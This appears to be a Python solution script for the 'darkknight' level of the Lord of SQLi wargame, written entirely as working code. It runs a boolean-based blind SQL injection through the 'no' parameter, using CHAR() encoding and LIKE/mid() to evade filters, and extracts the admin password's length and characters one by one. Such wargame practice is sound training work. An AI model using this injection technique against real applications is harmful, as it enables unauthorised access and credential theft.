import requests
import os


URL_ID=os.environ['URL_ID']

PHPSESSID=os.environ['PHPSESSID']


url = f"https://los.rubiya.kr/chall/darkknight_{URL_ID}.php"

cookie = {'PHPSESSID': PHPSESSID}



pw_length = 0

for  i in range(1, 100):

    res = requests.get(url, params={'no': f'0 || id like CHAR(0x61,0x64,0x6d,0x69,0x6e) && {i} < length(pw)'},cookies=cookie)

    if res.text.find("Hello admin") > 0:
        pw_length = i + 1
    else:
        break

print(f"pw length: {pw_length}")

ans = ""
for i in range(0, pw_length):
    for c in "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        res = requests.get(url, params={'no': f"0 || id like CHAR(0x61,0x64,0x6d,0x69,0x6e) && mid(pw,{i+1},1) like char({ord(c)})"}, cookies=cookie)
        if res.text.find("Hello admin") > 0:
            ans += c
            break
    print(f"(in progress)ans: {ans}")
    
print(f"pw: {ans}")

res = requests.get(url, params={'pw': ans, 'no': 0},cookies=cookie)

if res.text.find("Clear") > 0:
    print("Clear!")
else:
    print("Failed")